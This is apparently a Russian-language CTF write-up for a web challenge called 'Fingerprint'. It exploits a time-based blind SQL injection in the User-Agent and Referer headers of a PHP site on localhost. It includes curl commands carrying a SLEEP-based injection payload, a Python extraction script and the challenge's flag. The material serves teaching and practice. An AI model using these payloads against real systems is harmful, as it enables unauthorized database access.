# Fingerprint 

![Spiderman](https://trello-attachments.s3.amazonaws.com/57e50abe9d8488ae13f33d8c/5a2ac308d67d2c2812e7b916/07fb7efd234494710c1b2770e9e879fa/image.jpg)

**Description:** Мы обнаружили любопытный сайтик, который в принципе может следить за людьми. Попробуйте узнать что-нибудь о создателе сайта

**Author:** tiso a.k.a. tisOOv

**Category:** Web

**Score:** 300

**Note:** Для локального запуска запуска сервиса необходимо перейти в директорию source и выполнить указания из README.md

**Write-up:**

Начнём выполнять задание стандартно, откроём сервис в браузере. На странице увидим Make browser fingerprint. Но мы на ссылку сразу не поведёмся, попробуем посмотреть исходный код страницы:

```html
<html>
<head>
    <title>Make your browser fingerprint (Site under construction)</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous">
</head>
<body>
    <div class="container">
        <!-- Content here -->
        <h1>Make browser <a href="fingerprint.php">fingerprint</a>!</h1>
        <div class="row">
            <div class="col-lg-4 col-lg-offset-4">
                <div class="input-group">
                    <input id="search" type="text" class="form-control" /> 
                    <span class="input-group-btn">
                        <button class="btn btn-default" type="button" onclick="location.href='/info.php?' + document.getElementById('search').value;">Get info!</button>
                    </span>
                </div><!-- /input-group -->
            </div><!-- /.col-lg-4 -->
        </div><!-- /.row -->
    </div>
</body>
</html>
<!-- powered on php !-->
```

Ага, почти ничего полезного, но зато мы узнали, что код написан скорее всего на php, и при нажатии Get Info осуществляется перенаправление на страницу, info.php. Также есть страница fingerprint.php, на которую нас любезно зовут сделать отпечаток. Но сперва давайте проверим robots.txt, может там есть что-то полезное. И-и-и там 404. Ну ок, не получилось. Давайте поищем временные, мусорные файлы.. И-и-и, их тоже нет. Ну оок,давайте проверим cookies, может там есть что-то полезное? Эмм, и там ничего. Понятно, значит это задание не похоже на все предыдущие и нам нужно копать что-то новое (кстати, старые файлы и куки следует проверять на всех страничках). Давайте попробуем сходить на страницу fingerprint.php, может сумеем отыскать что-то интересное на ней. При первом заходе на страницу (сразу посмотрим в исходном коде):

```html

<html>
<head>
    <title>Make your browser fingerprint (Site under construction)</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous">

</head>
<body>
    <div class="container">
        <!-- Content here -->
        <h1>Make browser <a href="fingerprint.php">fingerprint</a>!</h1>
        <p>Record #3 1266f6c21a3fba349117fde269759483</p>
    </div>
</body>
</html>
```

Хмм, какая-то запись и судя по всему md5-хеш **1266f6c21a3fba349117fde269759483**. Ну, наверное...
Тааак, ладно, что делать дальше? На этой странице больше ничего нет. Ну давайте посмотрим, что будет, если эту страницу обновить, судя по всему какие-то записи создаются в БД. Может там будет 4 запись и т.д. и мы можем переполнить БД? :) Ну на самом деле на CTF вряд ли такое задание будет, но всё же (на самом деле **не будет**):

```html

<html>
<head>
    <title>Make your browser fingerprint (Site under construction)</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous">

</head>
<body>
    <div class="container">
        <!-- Content here -->
        <h1>Make browser <a href="fingerprint.php">fingerprint</a>!</h1>
        <p>Record #3 {"user_agent":"Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0","referer":null,"remote_addr":"172.17.0.1","fingerprint":"1266f6c21a3fba349117fde269759483"}</p>
    </div>
</body>
</html>
```

Ух, ты. А информации стало больше, мы тут увидели json-ку, которая содержит информацию о нашем браузере и отпечаток нашего браузера. Ну на самом деле это прикольно :) Теперь давайте вспомним (ну или узнаем), что никогда не стоит доверять данным, которые нам передаёт пользователь. А раз эти данные хранятся как-то, возможно они хранятся в БД, а если данные плохо фильтруются или не фильтруются, возможна такая атака, как sql-injection (о ней можете почитать [в хакере](https://xakep.ru/2011/12/06/57950/), [OWASP](https://www.owasp.org/index.php/Blind_SQL_Injection) и вообще в Интернетах информации ооочень много).

Обратим внимание, что в БД пишется такая информация, как user agent, referer, remote addr и fingerprint. Давайте попробуем при помощи curl проверить, возможна ли sql-injection в этих заголовках (да-да, это HTTP-заголовки, можно о них почитать [на Википедии](https://ru.wikipedia.org/wiki/%D0%97%D0%B0%D0%B3%D0%BE%D0%BB%D0%BE%D0%B2%D0%BA%D0%B8_HTTP))

```bash
curl 'http://localhost:9090/fingerprint.php' -H 'Host: localhost:9090' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0'
```

Для начала вообще попробуем просто поменять один из заголовков и посмотреть, что произойдёт, и произойдёт ли что-то:

```bash

curl 'http://localhost:9090/fingerprint.php' -H 'Host: localhost:9090' -H 'User-Agent: Test' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0'
```
```html
<html>
<head>
    <title>Make your browser fingerprint (Site under construction)</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css" integrity="sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb" crossorigin="anonymous">

</head>
<body>
    <div class="container">
        <!-- Content here -->
        <h1>Make browser <a href="fingerprint.php">fingerprint</a>!</h1>
        <p>Record #4 5f571ed9b2853163095a25112a4793c2</p>
    </div>
</body>
</html>

```

Как мы видим, создалась новая запись, значит от заголовков зависит отпечаток (логично, если честно). Таак а теперь давайте проверим на наличие sql-injection уязвимости!

```bash
curl 'http://localhost:9090/fingerprint.php' -H 'Host: localhost:9090' -H "User-Agent: Test'" -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0' 
```

```html
Something gonna wrong (remove after release)!!! Query exception: INSERT INTO browser_info(info, fingerprint) VALUES('{"user_agent":"Test\\'","referer":null,"remote_addr":"172.17.0.1","fingerprint":"0fbf02254385999b813e40d3760c4ca5"}', '0fbf02254385999b813e40d3760c4ca5')
```

Ооопс, что-то упало :) да и подсказывает нам, что sql-выражение не валидное!!! То есть да, есть sql-injection + есть возможность отладки выражения, правда, к сожалению, это не ответ БД, а ответ php, так что, судя по всему, нас ждёт [blind-sql](https://www.owasp.org/index.php/Blind_SQL_Injection).

Теперь попробуем сделать рабочий payload и проверить его:

```bash
curl 'http://localhost:9090/fingerprint.php' -H 'Host: localhost:9090' -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0" -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H "Referer: asdf', (SELECT IF(SUBSTRING(t.info, 1, 1) = '{', SLEEP(10), null) FROM (SELECT * FROM browser_info) AS t WHERE id=1));#;"
```

И-и-и действительно, мы будем ждать ответ от сервера некоторое время. Теперь только осталось автоматизировать процесс получения информации из БД. Автор представляет скриптик, написанный на Python, но лично Вы можете писать на чём угодно, к тому же данный скрипт, сразу предупреждаю, ооочень неэффективный, и сделано это специально :). Оставим Вам улучшение скрипта в качестве домашного задания (можете, например, использовать бинарный поиск или другие крутые штуки).

Скрипт на python

```python
import requests
import string
import sys


url = 'http://localhost:9090/fingerprint.php'

payload = b"asdf', (SELECT IF(SUBSTRING(t.info, %d, 1) = 0x%x, SLEEP(5), null) FROM (SELECT * FROM browser_info) AS t WHERE id=1));#;"


idx = 1
char_pos = 0
same_symbol = 0
last_symbol = None
while char_pos < len(string.printable) and same_symbol < 3:
    ch = string.printable[char_pos]
    if ch == '\n':
        char_pos += 1
        continue
    try:
        r = requests.get(url, headers={'referer': payload % (idx, ord(ch))}, timeout=3)
    except requests.exceptions.ReadTimeout:
        idx += 1
        sys.stdout.write(ch)
        sys.stdout.flush()
        if last_symbol == ch:
            same_symbol += 1
        last_symbol = ch
        char_pos = 0
    except Exception:
        char_pos += 1
        pass
    else:
        char_pos +=1
        if char_pos >= len(string.printable):
            print('\nFinish!')
            break

print('\nFinish!')

```

Результат работы скрипта:

```
{'user_agent': 'itf{sql1nj3ct1on1sbayan!!1}'}
```

Флаг - itf{sql1nj3ct1on1sbayan!!1}

Done! :)